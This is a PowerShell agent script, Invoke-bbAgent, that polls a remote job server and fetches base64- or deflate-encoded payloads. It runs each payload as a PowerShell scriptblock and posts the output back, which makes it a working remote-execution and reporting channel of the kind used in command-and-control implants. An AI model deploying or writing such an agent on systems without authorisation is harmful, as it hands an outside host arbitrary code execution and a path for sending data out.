function Invoke-bbAgent
{
    [CmdletBinding()]
    Param
    (
        # IP to job server
        [Parameter(Mandatory=$true, Position=0)]
        [string]$ServerIP,
        #Port of job server
        [Parameter(Mandatory=$true, Position=1)]
        [int]$Port
    )
    
    #Initialize Global webclient 2.0 compatible.
    Write-Verbose "Initializing global variables."
    add-type -assembly system.web.extensions
    $webc = New-Object System.Net.WebClient    
    $baseserver = "http://" + $ServerIP + ":" + $Port + "/"
    $jobURL = $baseserver + "getJob1"
    $dataURL = $baseserver + "pushData"

    #Helper Functions
    ##################

    #Powershell 2 compatable versions of json conversion functions.
    function ConvertTo-Json20
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [psobject]$item
        )
        Write-Verbose "Converting object to JSON."
        $ps_js=new-object system.web.script.serialization.javascriptSerializer
        return $ps_js.Serialize($item)
    }

    function ConvertFrom-Json20
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$item
        )
        Write-Verbose "Converting object from JSON."
        $ps_js=new-object system.web.script.serialization.javascriptSerializer
        $ps_js.MaxJsonLength = [System.Int32]::MaxValue
        #The comma operator is the array construction operator in PowerShell
        return ,$ps_js.DeserializeObject($item)
    }

    #Convert payload encoding formats
    #Convert from base64
    function ConvertFrom-Base64
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$payload
        )
        Write-Verbose "Converting string from base64."
        return [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($payload)))
    }

    #Uncompress encoded compressed script
    function ConvertFrom-CompressedEncoded
    {
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory=$true)]
            [string]$CompressedScript
        )
        Write-Verbose "Converting string from compressed encoding."
        $decodedCompressedBytes = [IO.MemoryStream][Convert]::FromBase64String($CompressedScript)
        $uncompressedBytes = New-Object IO.Compression.DeflateStream($decodedCompressedBytes,[IO.Compression.CompressionMode]::Decompress)
        return (New-Object IO.StreamReader($uncompressedBytes,[Text.Encoding]::ASCII)).ReadToEnd()
    }

    #JobCycle
    function Start-JobCycle
    {
        [CmdletBinding()]
        Param()

        $emptycount = 0
        Write-Verbose "Beginning Job loop inside Start-Job function."
        while($emptycount -le 3)
        {
            Write-Verbose "Testing to see if server machine is online."
            if(Test-Connection -ComputerName $ServerIP -Count 1 -Quiet)
            {
                Write-Verbose "Checking for finished jobs."
                $doneJobs = Get-Job | where {@("Completed","Blocked","Failed") -contains $_.State}
                if($doneJobs)
                {
                    Write-Verbose "Jobs were found, processing."
                    $doneJobs | where {$_.state -eq "Completed"} | foreach {
                        Write-Verbose ("Completed jobs are: {0}" -f ($_ | out-string))
                        if($_.HasMoreData)
                        {
                            $jobData = Receive-Job $_ -ErrorAction SilentlyContinue -ErrorVariable "jobError" | Out-String
                            $jobData += "`r`n{0}" -f $($jobError | Out-String)
                            if([string]::IsNullOrEmpty($jobData))
                            {
                                Write-Verbose ("Job:{0} has no data, returning default." -f $_.Name)
                                $jobdata = "Job finished, no data"
                            }
                            $returnobj = @{
                                jobName = $_.Name
                                data = $jobData
                            }
                            $jobJSON = ConvertTo-Json20 -item $returnobj
                            Write-Verbose ("Removing Job:{0} and sending data." -f $_.Name)
                            $null = remove-job $_
                            Write-Verbose ("Data being sent is: {0}" -f $jobJSON)
                            Write-Verbose ("Url being sent to: {0}" -f $dataURL)
                            $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
                            Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
                            $webc.UploadString($dataURL, "POST", $jobJSON)
                        }
                    }
                    $doneJobs | where {@("Blocked","Failed") -contains $_.State} | foreach {
                        Write-Verbose ("Blocked and Failed Jobs are: {0}" -f ($_ | out-string))
                        $jobData = "Job was terminated because it failed or was in block state for user input.`r`n"
                        if($_.HasMoreData)
                        {
                            $jobData += Receive-Job $_ -ErrorAction SilentlyContinue -ErrorVariable "jobError"
                            if($jobError)
                            {
                                $jobData += "`r`n{0}" -f $jobError
                            }
                        }
                        $returnobj = @{
                            jobName = $_.Name
                            data = $jobData
                        }
                        $jobJSON = ConvertTo-Json20 -item $returnobj                       
                        Write-Verbose ("Removing and sending Job: {0}" -f $_.Name)
                        $null = Stop-Job $_ -PassThru | Remove-Job
                        Write-Verbose ("Data being sent is: {0}" -f $jobJSON)
                        Write-Verbose ("Url being sent to: {0}" -f $dataURL)
                        $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
                        Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
                        $webc.UploadString($dataURL, "POST", (ConvertTo-Json20 -item $returnobj))
                    }
                }
                Write-Verbose "Getting jobs from server."
                Try
                {
                    $payloadobj = ConvertFrom-Json20 -item $($webc.DownloadString($jobURL))
                }
                catch
                {
                    $payloadobj = $null
                }
                
                if($payloadobj -and $payloadobj.jobName -ne "none")
                {
                    $emptycount = 0
                    Write-Verbose ("Payload encoding is: {0}" -f $payloadobj.encoding)
                    if($payloadobj.encoding -eq "base64")
                    {                        
                        $payloadobj.payload = ConvertFrom-Base64 -payload $($payloadobj.payload)
                    }
                    if($payloadobj.encoding -eq "compressed")
                    {
                        $payloadobj.payload = ConvertFrom-CompressedEncoded -CompressedScript $($payloadobj.payload)
                    }
                    Write-Verbose "Appending command to script."
                    $payloadobj.payload += $payloadobj.command
                    Write-Verbose "Creating scriptblock from payload."
                    $payload = [scriptblock]::Create(($payloadobj.payload))
                    Write-Verbose "Starting job from payload."
                    $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload
                }
                elseif((Get-Job))
                {
                    Write-Verbose "Jobs still running, no jobs on server queue, resetting timeout."
                    $emptycount = 0
                }
                else
                {
                    Write-Verbose "Job queue empty, no more jobs from server, timeout incremented."
                    $emptycount++
                }
            }
            else
            {
                Write-Verbose "Server not found, incrementing timeout counter."
                $emptycount++
            }
            Write-Verbose "Sleeping for 1 seconds."
            sleep -Seconds 1
        }
        Write-Verbose "Sending server quit command."
        try
        {
            $null = $webc.DownloadString($baseserver + "quit")
        }
        catch
        {
            Write-Verbose "Server is not up, quit was not received."
        }
    }
    Start-JobCycle
    Write-Verbose "Garbage collecting before exiting."
    [System.GC]::Collect()
}
